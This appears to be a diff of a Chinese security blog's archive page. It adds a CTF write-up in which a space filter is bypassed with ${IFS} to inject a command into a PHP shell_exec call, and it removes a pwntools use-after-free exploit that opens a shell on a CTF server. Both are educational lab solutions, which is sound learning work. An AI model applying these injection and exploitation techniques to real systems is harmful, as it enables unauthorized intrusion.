@@ -76,6 +76,100 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
+                <a href="/2025/04/27/从0开始的web生涯-SWPUCTF-2021-新生赛-babyrce/" title="从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce">
+                    从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-04-27
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]==<span class="hljs-number">1</span>) &#123;
+	<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../next.php&quot;</span>;
+&#125; <span class="hljs-keyword">else</span>
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小饼干最好吃啦！&quot;</span>;
+<span class="hljs-meta">?&gt;</span> 小饼干最好吃啦！</code></pre>
+
+<p>直接传递cookies admin 为1 就可以</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 
+
+url = <span class="hljs-string">&quot;http://node5.anna.nssctf.cn:29857/&quot;</span>
+
+cookies = &#123;
+
+  <span class="hljs-string">&#x27;admin&#x27;</span>: <span class="hljs-string">&quot;1&quot;</span>
+
+&#125;
+
+resp = requests.post(url=url,cookies=<span class="hljs-number">1</span>)
+
+<span class="hljs-built_in">print</span>(resp.text)
+
+</code></pre>
+
+<p>得到rasalghul.php</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;
+	<span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
+	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>)) &#123;
+		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);
+	&#125;
+	<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$ip</span>);
+	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>正则过滤空格 ${IFS}可绕过 ${IFS} - Linux 下的空白字符 </p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 
+
+param = <span class="hljs-string">&quot;ls$&#123;IFS&#125;/&quot;</span>
+
+url = <span class="hljs-string">f&quot;http://node5.anna.nssctf.cn:29857/rasalghul.php?url=<span class="hljs-subst">&#123;param&#125;</span>&quot;</span>
+
+resp = requests.get(url=url)
+
+<span class="hljs-built_in">print</span>(resp.text)</code></pre>
+
+<p>flag为flllllaaaaaaggggggg</p>
+<blockquote>
+<p>boot<br>dev<br>etc<br>flllllaaaaaaggggggg<br>home<br>lib<br>lib64<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>srv<br>sys<br>tmp<br>usr<br>var</p>
+</blockquote>
+<p>结束</p>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
                 <a href="/2025/04/24/记一次vmware-linux扩展-根目录-分区/" title="记一次vmware linux扩展/(根目录)分区">
                     记一次vmware linux扩展/(根目录)分区
                 </a>
@@ -1236,97 +1330,6 @@ io.interactive()</code></pre>
 </article>
 
         
-            
-            <article class="article">
-    <div class="article-wrap">
-        
-            <h2 class="article-title cl">
-                <a href="/2025/04/20/入门的UAF/" title="入门的UAF">
-                    入门的UAF
-                </a>
-            </h2>
-        
-
-        <ul class="article-extra" style="margin-bottom: 20px">
-            
-            <li class="article-time">
-                2025-04-20
-            </li>
-            
-
-            
-                
-            
-
-
-        </ul>
-        <div class="article-description">
-            
-            <blockquote>
-<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2161">[NISACTF 2022]UAF</a></p>
-</blockquote>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>sh\x00\x00对齐 然后NICO是后门函数</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
-io = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28208</span>)
-<span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span>
-e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
-libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc-2.31.so&#x27;</span>)
-
-s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
-sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
-sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
-sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
-r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
-ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
-itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
-uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
-
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>():
-    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
-    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
-    sl(<span class="hljs-built_in">str</span>(idx))
-    sla(<span class="hljs-string">b&quot;Input your strings&quot;</span>,content)
-
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
-    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
-    sl(<span class="hljs-built_in">str</span>(idx))
-
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
-    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
-    sl(<span class="hljs-built_in">str</span>(idx))
-
-new()
-free(<span class="hljs-number">0</span>)
-new()
-edit(<span class="hljs-number">1</span>,(<span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span>+p32(e.sym[<span class="hljs-string">&quot;NICO&quot;</span>])))
-show(<span class="hljs-number">0</span>)
-
-
-<span class="hljs-comment">#attach(io)</span>
-
-io.interactive()</code></pre>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
-<li>对该题的考点总结</li>
-</ul>
-
-        </div>
-        
-            
-        
-        
-    </div>
-</article>
-
-        
         <ul class="pagination clear">
     <a class="extend prev" rel="prev" href="/archives/2025/">上一页</a><a class="page-number" href="/archives/2025/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2025/page/3/">3</a><a class="extend next" rel="next" href="/archives/2025/page/3/">下一页</a>
 </ul>
@@ -1340,14 +1343,14 @@ io.interactive()</code></pre>
         
         <div class="widget-post widget" style="order: 1 ">
             <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
-            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/">windows 虚拟内存笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/">Wincor Nixdorf PORT IO Driver Stack Overflow</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize</a></li></ul>
+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/09/17/UEFI-Start-Hello-World/">UEFI Start - Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/">windows 虚拟内存笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/">Wincor Nixdorf PORT IO Driver Stack Overflow</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li></ul>
         </div>
         
 
         
         <div class="widget-tags widget" style="order: 2 ">
             <h2 class="widget-title"><i class="fa fa-tags"></i> 标签</h2>
-            <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
+            <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/UEFI/" style="font-size: 10px;">UEFI</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
         </div>
         
 
